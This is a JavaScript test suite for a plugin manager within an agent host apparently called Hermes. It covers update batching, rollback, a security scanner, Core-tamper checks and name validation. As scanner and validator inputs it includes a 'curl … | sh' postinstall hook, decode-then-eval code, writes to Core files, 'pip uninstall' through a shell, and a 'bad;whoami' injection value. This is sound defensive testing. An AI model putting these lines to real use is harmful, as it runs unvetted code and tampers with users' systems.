import fs from 'node:fs'
import assert from 'node:assert/strict'

let source = fs.readFileSync(new URL('../plugin.js', import.meta.url), 'utf8')

source = source.replace(
  /import \{[\s\S]*?\} from '@hermes\/plugin-sdk'/,
  "const host = globalThis.__menderHost = {}; const atom = v => ({ get: () => v, set: n => { v = n } }); const useValue = a => a.get(); const Button = function() {}; const Dialog = function() {}; const DialogContent = function() {}; const DialogDescription = function() {}; const DialogFooter = function() {}; const DialogHeader = function() {}; const DialogTitle = function() {}; const ROUTES_AREA = 'routes'; const STATUSBAR_AREAS = { right: 'status-right' }; const PALETTE_AREA = 'palette'"
)
source = source.replace(
  "import { jsx, jsxs } from 'react/jsx-runtime'",
  "const jsx = function() { return null }; const jsxs = function() { return null }"
)
source = source.replace('export default plugin', 'globalThis.__menderPlugin = plugin')
source = source.replace('export const __test =', 'globalThis.__menderTest =')

await import('data:text/javascript;base64,' + Buffer.from(source).toString('base64'))

const t = globalThis.__menderTest
assert.ok(t)

assert.equal(t.extractPluginId("const ID = 'alpha'"), 'alpha')
assert.equal(t.extractPluginId('export default { id: "beta", register() {} }'), 'beta')
assert.equal(t.githubRepoSlug('https://github.com/owner/repo'), 'owner/repo')
assert.equal(t.githubRepoSlug('https://example.com/owner/repo'), null)

assert.equal(t.normalizeRepairIntervalSeconds(5), 10)
assert.equal(t.normalizeRepairIntervalSeconds('60'), 60)
assert.equal(t.normalizeRepairIntervalSeconds(9999), 3600)
assert.equal(t.repairTimerDelayMs('off', 60), null)
assert.equal(t.repairTimerDelayMs('interval', 30), 30000)
assert.equal(t.repairTimerDelayMs('auto', 30), 300000)
assert.equal(t.isAutomaticRepairReason('directory-change'), true)
assert.equal(t.isAutomaticRepairReason('manual'), false)

assert.equal(t.normalizeUpdateCheckIntervalSeconds(60), 300)
assert.equal(t.normalizeUpdateCheckIntervalSeconds('21600'), 21600)
assert.equal(t.updateCheckTimerDelayMs('off', 3600), null)
assert.equal(t.updateCheckTimerDelayMs('interval', 3600), 3600000)
assert.equal(t.updateCheckTimerDelayMs('auto', 3600), 21600000)

assert.equal(t.compareVersions('0.7.1', '0.7.0'), 1)
assert.equal(t.compareVersions('0.7.0', '0.7.0'), 0)
assert.equal(t.compareVersions('0.7.0-dev', '0.7.0'), -1)

const duplicatePlan = t.dedupeUpdateItems([
  { kind: 'plugin', identity: 'alpha', targetSha: 'a'.repeat(40), status: 'available' },
  { kind: 'plugin', identity: 'alpha', targetSha: 'a'.repeat(40), status: 'available', detail: 'newer copy' },
  { kind: 'plugin', identity: 'beta', targetSha: 'b'.repeat(40), status: 'available' },
  { kind: 'self', identity: 'milanworks/hermes-mender', targetVersion: '0.8.0', status: 'available' }
])
assert.equal(duplicatePlan.length, 3)
assert.equal(duplicatePlan.find(x => x.identity === 'alpha').detail, 'newer copy')
assert.equal(t.isUpdateItemApplicable({ status: 'available', blocked: false }), true)
assert.equal(t.isUpdateItemApplicable({ status: 'available', blocked: true }), false)
assert.equal(t.isUpdateItemApplicable({ status: 'core-review-required', blocked: true }), false)

const planForSelection = { items: duplicatePlan }
const selection = t.selectedUpdateItems(planForSelection, { keys: [duplicatePlan[0].key, duplicatePlan[2].key] })
assert.equal(selection.length, 2)

assert.equal(
  t.isHermesScannerBlockedResult({ ok: false, scan_blocked: true, error: 'blocked' }),
  true
)
assert.equal(
  t.isHermesScannerBlockedResult({ ok: false, error: 'Security scan blocked plugin install: critical finding' }),
  true
)
assert.equal(
  t.isHermesScannerBlockedResult({ ok: false, error: 'network failed' }),
  false
)

// One confirmed batch must isolate mixed outcomes: one successful update must
// still apply even when later candidates widen capabilities or hit Hermes' scanner.
const batchItems = [
  {
    kind: 'plugin',
    identity: 'normal-update',
    plugin: 'normal-update',
    agentName: 'normal-update',
    targetSha: '1'.repeat(40),
    status: 'available',
    blocked: false
  },
  {
    kind: 'plugin',
    identity: 'failing-update',
    plugin: 'failing-update',
    agentName: 'failing-update',
    targetSha: '2'.repeat(40),
    status: 'available',
    blocked: false
  },
  {
    kind: 'plugin',
    identity: 'widening-update',
    plugin: 'widening-update',
    agentName: 'widening-update',
    targetSha: '3'.repeat(40),
    status: 'available',
    blocked: false
  },
  {
    kind: 'plugin',
    identity: 'scanner-update',
    plugin: 'scanner-update',
    agentName: 'scanner-update',
    targetSha: '4'.repeat(40),
    status: 'available',
    blocked: false
  }
].map(item => ({ ...item, key: t.updateItemKey(item) }))

t.updatePlanState.set({ status: 'ready', checkedAt: 'test', items: batchItems, error: null })
t.updateReviewState.set({ open: true, keys: batchItems.map(item => item.key) })
t.compatibilityState.set({ status: 'compatible', checkedAt: 'test', summary: 'ok', checks: [] })

const updateCalls = []
globalThis.__menderHost.request = async (_method, payload) => {
  if (payload.action !== 'update') throw new Error('unexpected request in batch test')
  updateCalls.push(payload.name)

  if (payload.name === 'normal-update') return { ok: true, unchanged: false }
  if (payload.name === 'failing-update') throw new Error('fixture update failure')
  if (payload.name === 'widening-update') {
    return { ok: false, consent_required: true, delta_lines: ['hooks: pre_llm_call'] }
  }
  if (payload.name === 'scanner-update') {
    return {
      ok: false,
      error: 'Security scan blocked plugin install: dangerous verdict'
    }
  }
  throw new Error('unknown batch item')
}
globalThis.__menderHost.notify = () => {}

const batchActions = await t.applyConfirmedUpdates({ refresh: false, reconcile: false })
assert.deepEqual(updateCalls, ['normal-update', 'failing-update', 'widening-update', 'scanner-update'])
assert.deepEqual(
  batchActions.map(action => action.type),
  ['update-applied', 'update-failed', 'update-review-required', 'hermes-core-update-blocked']
)
assert.match(batchActions[1].detail, /fixture update failure/)
assert.deepEqual(batchActions[2].capabilityChanges, ['hooks: pre_llm_call'])
assert.equal(t.operationBusy.get(), false)
assert.equal(t.updateReviewState.get().open, false)

const desktopFileState = new Map([
  ['C:/fixture/theme.css', 'old-theme'],
  ['C:/fixture/plugin.js', 'old-plugin']
])
let failNewPluginWrite = true
const desktopTransactionMock = {
  readFileText: async path => {
    if (!desktopFileState.has(path)) throw new Error('missing')
    return { text: desktopFileState.get(path) }
  },
  writeTextFile: async (path, text) => {
    if (path.endsWith('/plugin.js') && text === 'new-plugin' && failNewPluginWrite) {
      failNewPluginWrite = false
      throw new Error('fixture second write failed')
    }
    desktopFileState.set(path, text)
    return { path }
  },
  trashPath: async path => {
    desktopFileState.delete(path)
    return true
  }
}
const rollbackResult = await t.writeDesktopFilesTransactional(
  desktopTransactionMock,
  'C:/fixture',
  [
    { name: 'theme.css', text: 'new-theme' },
    { name: 'plugin.js', text: 'new-plugin' }
  ]
)
assert.equal(rollbackResult.ok, false)
assert.equal(rollbackResult.rolledBack, true)
assert.match(rollbackResult.error, /fixture second write failed/)
assert.equal(desktopFileState.get('C:/fixture/theme.css'), 'old-theme')
assert.equal(desktopFileState.get('C:/fixture/plugin.js'), 'old-plugin')

const critical = t.scanSource("eval('x')", 'plugin.js')
assert.equal(critical[0].severity, 'critical')
assert.equal(t.hasBlockingFinding(critical), true)

const high = t.scanSource("host.request('shell.exec', { command: 'echo ok' })", 'plugin.js')
assert.ok(high.some(x => x.severity === 'high'))
assert.equal(t.hasBlockingFinding(high), false)
assert.equal(t.hasBlockingFinding(high, 'strict'), true)
assert.equal(t.hasBlockingFinding(high, 'off'), false)

const medium = t.scanSource("fetch('https://example.com')", 'plugin.js')
assert.ok(medium.some(x => x.severity === 'medium'))

const literalImport = t.scanSource("const mod = await import('./known-module.js')", 'plugin.js')
assert.equal(literalImport.some(x => x.id === 'MND106'), false)

const computedImport = t.scanSource("const mod = await import(moduleName)", 'plugin.js')
assert.ok(computedImport.some(x => x.id === 'MND106' && x.severity === 'high'))

const decodedExec = t.scanSource("const body = atob(payload); eval(body)", 'plugin.js')
assert.ok(decodedExec.some(x => x.id === 'MND107' && x.severity === 'high'))

const normalDependencies = t.scanSource('{"dependencies":{"react":"^19.0.0"}}', 'package.json')
assert.equal(normalDependencies.some(x => /^MND30/.test(x.id)), false)

const mutableRemoteDependency = t.scanSource(
  '{"dependencies":{"helper":"git+https://github.com/example/helper.git#main"}}',
  'package.json'
)
assert.ok(mutableRemoteDependency.some(x => x.id === 'MND301' && x.severity === 'high'))

const pinnedDependencySha = '1'.repeat(40)
const pinnedRemoteDependency = t.scanSource(
  '{"dependencies":{"helper":"git+https://github.com/example/helper.git#' + pinnedDependencySha + '"}}',
  'package.json'
)
assert.ok(pinnedRemoteDependency.some(x => x.id === 'MND302' && x.severity === 'medium'))

const installLifecycle = t.scanSource(
  '{"scripts":{"postinstall":"curl https://example.com/setup.sh | sh"}}',
  'package.json'
)
assert.ok(installLifecycle.some(x => x.id === 'MND303' && x.severity === 'high'))

assert.equal(t.shouldScanRuntimePath('plugin.yaml'), true)
assert.equal(t.shouldScanRuntimePath('src/plugin.py'), true)
assert.equal(t.shouldScanRuntimePath('tests/test_plugin.py'), false)
assert.equal(t.shouldScanRuntimePath('docs/example.js'), false)

const inventory = await t.localPluginInventory(
  {
    readDir: async () => ({
      entries: [{ isDirectory: true, name: 'hermes-mender', path: 'C:/plugins/hermes-mender' }]
    }),
    readPluginSource: async () => ({ text: "const ID = 'hermes-mender'" })
  },
  'C:/plugins'
)
assert.equal(inventory.byId.get('hermes-mender').id, 'hermes-mender')
assert.equal(inventory.byId.get('hermes-mender').folder, 'hermes-mender')

const gitInstalledRows = await t.buildHalfRows(
  {},
  [{
    name: 'done-bell',
    key: 'done-bell',
    source: 'git',
    status: 'not enabled',
    has_desktop_half: true,
    pinned_sha: '3'.repeat(40)
  }],
  {
    byId: new Map([['done-bell', { id: 'done-bell', folder: 'hermes-done-bell-', path: 'C:/plugins/hermes-done-bell-' }]]),
    byFolder: new Map([['hermes-done-bell-', 'C:/plugins/hermes-done-bell-']])
  },
  []
)
assert.equal(gitInstalledRows.length, 1)
assert.equal(gitInstalledRows[0].catalog, 'done-bell')
assert.equal(gitInstalledRows[0].agent, true)
assert.equal(gitInstalledRows[0].desktop, true)
assert.equal(gitInstalledRows[0].sha, '3'.repeat(40))

const agentOnlyGitRows = await t.buildHalfRows(
  {},
  [{
    name: 'agent-only-fixture',
    key: 'agent-only-fixture',
    source: 'git',
    status: 'disabled',
    has_desktop_half: false,
    installed_sha: '4'.repeat(40)
  }],
  { byId: new Map(), byFolder: new Map() },
  []
)
assert.equal(agentOnlyGitRows.length, 1)
assert.equal(agentOnlyGitRows[0].catalog, 'agent-only-fixture')
assert.equal(agentOnlyGitRows[0].agent, true)
assert.equal(agentOnlyGitRows[0].desktopExpected, false)
assert.equal(agentOnlyGitRows[0].desktop, false)

const bundledAgentOnlyRows = await t.buildHalfRows(
  {},
  [{
    name: 'bundled-only',
    key: 'bundled-only',
    source: 'bundled',
    status: 'enabled',
    has_desktop_half: false
  }],
  { byId: new Map(), byFolder: new Map() },
  []
)
assert.equal(bundledAgentOnlyRows.length, 0, 'bundled Agent-only plugins stay out of Mender package rows')

const catalog = [{ name: 'foo', repo: 'https://github.com/a/foo' }, { name: 'bar', repo: 'https://github.com/a/bar' }]
assert.equal(t.catalogEntryForLocal({ id: 'foo', folder: 'foo' }, catalog).name, 'foo')
assert.equal(t.catalogEntryForLocal({ id: 'different', folder: 'bar' }, catalog).name, 'bar')
assert.equal(t.catalogEntryForLocal({ id: 'none', folder: 'none' }, catalog), null)

assert.equal(
  t.isExpectedMissingHalf({ agentExpected: false, agent: false, desktopExpected: true, desktop: true }),
  false
)
assert.equal(
  t.isExpectedMissingHalf({ agentExpected: true, agent: false, desktopExpected: true, desktop: true }),
  true
)

const previousComplete = { agent: true, desktop: true }
const nowAgentGone = { agentExpected: true, desktopExpected: true, agent: false, desktop: true }
assert.equal(t.shouldTreatAsIntentionalAgentRemoval(previousComplete, nowAgentGone, 'timer'), true)
assert.equal(t.shouldTreatAsIntentionalAgentRemoval(previousComplete, nowAgentGone, 'manual'), false)
assert.equal(t.shouldTreatAsIntentionalAgentRemoval({ agent: false, desktop: true }, nowAgentGone, 'timer'), false)

assert.equal(t.desktopUpdateTextFile('plugin.js'), true)
assert.equal(t.desktopUpdateTextFile('theme.css'), true)
assert.equal(t.desktopUpdateTextFile('icon.svg'), true)
assert.equal(t.desktopUpdateTextFile('payload.bin'), false)

const coreWrite = t.scanCoreTamperSource(
  "const p = '/usr/local/lib/hermes-agent/hermes_cli/main.py'; write_text(p, 'x')",
  'plugin.py'
)
assert.ok(coreWrite.some(x => x.id === 'CORE001' && x.severity === 'critical'))
assert.equal(t.hasCoreProtectionBlocker(coreWrite, 'smart'), false, 'Smart asks; it does not hard-block')
assert.equal(t.hasCoreProtectionBlocker(coreWrite, 'strict'), true, 'Strict blocks Core tamper')
assert.equal(t.hasCoreProtectionBlocker(coreWrite, 'off'), false, 'Off allows Core tamper at the Mender layer')

const internalOnly = t.scanCoreTamperSource("from hermes_cli import plugins_cmd", 'plugin.py')
assert.ok(internalOnly.some(x => x.id === 'CORE102' && x.severity === 'medium'))
assert.equal(t.hasCoreProtectionBlocker(internalOnly, 'strict'), false)

const internalPatch = t.scanCoreTamperSource(
  "from hermes_cli import plugins_cmd\nmock.patch.object(plugins_cmd, 'x', 1)",
  'plugin.py'
)
assert.ok(internalPatch.some(x => x.id === 'CORE101' && x.severity === 'high'))
assert.equal(t.hasCoreProtectionBlocker(internalPatch, 'strict'), true)

const supportedOverrideDeclaration = t.scanCoreTamperSource(
  "capabilities: ['tools.override', 'llm.model_override']",
  'plugin.yaml'
)
assert.equal(supportedOverrideDeclaration.length, 0)

const unrelatedPatch = t.scanCoreTamperSource(
  "const tools = makeLocalTools(); mock.patch.object(tools, 'render', replacement)",
  'plugin.py'
)
assert.equal(unrelatedPatch.length, 0, 'generic local tools symbol is not Hermes Core by itself')

const explicitRuntimePatch = t.scanCoreTamperSource(
  "mock.patch('hermes_cli.plugins_cmd.remove', replacement)",
  'plugin.py'
)
assert.ok(explicitRuntimePatch.some(x => x.id === 'CORE002' && x.severity === 'critical'))

const packageRuntimeMutation = t.scanCoreTamperSource(
  "subprocess.run('pip uninstall hermes-agent -y', shell=True)",
  'plugin.py'
)
assert.ok(packageRuntimeMutation.some(x => x.id === 'CORE003' && x.severity === 'critical'))

const windowsCoreWrite = t.scanCoreTamperSource(
  "open('C:\\Hermes\\hermes-agent\\gateway\\run.py', 'w').write(payload)",
  'plugin.py'
)
assert.ok(windowsCoreWrite.some(x => x.id === 'CORE001' && x.severity === 'critical'))

const shaA = 'a'.repeat(40)
const shaB = 'b'.repeat(40)
assert.equal(t.coreApprovalKey('owner/repo', shaA), 'owner/repo@' + shaA)
assert.equal(t.coreApprovalKey('owner/repo', 'short'), null)

let pf = t.runPreflight(
  [{ path: 'plugin.py', text: "const p = '/usr/local/lib/hermes-agent/hermes_cli/main.py'; write_text(p, 'x')" }],
  { identity: 'owner/repo', sha: shaA }
)
let decision = t.preflightDecision(pf, 'owner/repo', shaA)
assert.equal(decision.allowed, false)
assert.equal(decision.stage, 'core-review-required')
assert.equal(decision.canApproveCore, true)

assert.equal(t.setCoreVersionApproval('owner/repo', shaA, true), true)
assert.equal(t.isCoreVersionApproved('owner/repo', shaA), true)
assert.equal(t.isCoreVersionApproved('owner/repo', shaB), false)

pf = t.runPreflight(
  [{ path: 'plugin.py', text: "const p = '/usr/local/lib/hermes-agent/hermes_cli/main.py'; write_text(p, 'x')" }],
  { identity: 'owner/repo', sha: shaA }
)
decision = t.preflightDecision(pf, 'owner/repo', shaA)
assert.equal(decision.allowed, true, 'exact SHA approval allows Core protection exception')

assert.equal(t.setCoreVersionApproval('owner/repo', shaA, false), true)
assert.equal(t.isCoreVersionApproved('owner/repo', shaA), false, 'revocation removes the exact SHA approval')
pf = t.runPreflight(
  [{ path: 'plugin.py', text: "const p = '/usr/local/lib/hermes-agent/hermes_cli/main.py'; write_text(p, 'x')" }],
  { identity: 'owner/repo', sha: shaA }
)
assert.equal(t.preflightDecision(pf, 'owner/repo', shaA).stage, 'core-review-required')
assert.equal(t.setCoreVersionApproval('owner/repo', shaA, true), true)

const differentSha = t.runPreflight(
  [{ path: 'plugin.py', text: "const p = '/usr/local/lib/hermes-agent/hermes_cli/main.py'; write_text(p, 'x')" }],
  { identity: 'owner/repo', sha: shaB }
)
assert.equal(t.preflightDecision(differentSha, 'owner/repo', shaB).stage, 'core-review-required')

const securityStillBlocks = t.runPreflight(
  [{ path: 'plugin.js', text: "eval('x')" }],
  { identity: 'owner/repo', sha: shaA }
)
assert.equal(t.preflightDecision(securityStillBlocks, 'owner/repo', shaA).stage, 'security-blocked')
assert.equal(t.preflightDecision(securityStillBlocks, 'owner/repo', shaA).canApproveCore, false)

assert.equal(t.coreApprovalEffective('smart', true), true)
assert.equal(t.coreApprovalEffective('strict', true), false, 'Strict ignores stored SHA approvals')
assert.equal(t.coreApprovalEffective('off', true), false)

const strictDecision = t.preflightDecision(
  { securityBlocked: false, coreBlocked: true, reviewRequired: false },
  'owner/repo',
  shaA
)
assert.equal(strictDecision.allowed, false)
assert.equal(strictDecision.stage, 'core-blocked')
assert.equal(strictDecision.canApproveCore, false, 'Strict exposes no exact-version bypass')

assert.equal(
  t.evaluateCompatibilityChecks([
    { id: 'required', label: 'Required', ok: true, required: true },
    { id: 'optional', label: 'Optional', ok: true, required: false }
  ]).status,
  'compatible'
)
assert.equal(
  t.evaluateCompatibilityChecks([
    { id: 'required', label: 'Required', ok: true, required: true },
    { id: 'optional', label: 'Optional', ok: false, required: false }
  ]).status,
  'degraded'
)
assert.equal(
  t.evaluateCompatibilityChecks([
    { id: 'required', label: 'Required', ok: false, required: true }
  ]).status,
  'unsupported'
)

const parsedShort = t.parseGitHubInstallIdentifier('owner/repo#catalog')
assert.equal(parsedShort.slug, 'owner/repo')
assert.equal(parsedShort.subdir, 'catalog')
assert.equal(parsedShort.identity, 'owner/repo#catalog')

const parsedUrl = t.parseGitHubInstallIdentifier('https://github.com/owner/repo/tree/main/catalog')
assert.equal(parsedUrl.slug, 'owner/repo')
assert.equal(parsedUrl.ref, 'main')
assert.equal(parsedUrl.subdir, 'catalog')

assert.throws(() => t.parseGitHubInstallIdentifier('https://example.com/owner/repo'))
assert.throws(() => t.parseGitHubInstallIdentifier('owner/repo#../escape'))

assert.equal(t.safeCliPluginName('hermes-rss'), 'hermes-rss')
assert.equal(t.safeCliPluginName('quota.v2'), 'quota.v2')
assert.equal(t.safeCliPluginName('bad;whoami'), null)
assert.equal(t.safeCliPluginName('../escape'), null)

console.log('mender-runtime: ok')
